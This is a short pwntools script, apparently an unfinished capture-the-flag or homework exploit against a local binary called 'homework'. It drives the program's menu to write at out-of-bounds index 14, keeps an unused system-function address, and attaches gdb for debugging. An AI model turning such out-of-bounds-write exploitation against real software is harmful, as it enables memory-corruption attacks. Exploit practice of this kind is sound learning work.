from pwn import *


target = process('/home/star/Desktop/homework')
target.recvuntil('your name')
target.sendline('carl')
target.recvuntil('>')
target.sendline('1')
addr_sys = 0x08048604
target.recvuntil('Index to edit:')
target.sendline('14')
target.recvuntil('How many?')
target.sendline('AAAA')
target.recvuntil('>')
target.sendline('0')
gdb.attach(target,'b *0x0804888a')
target.interactive()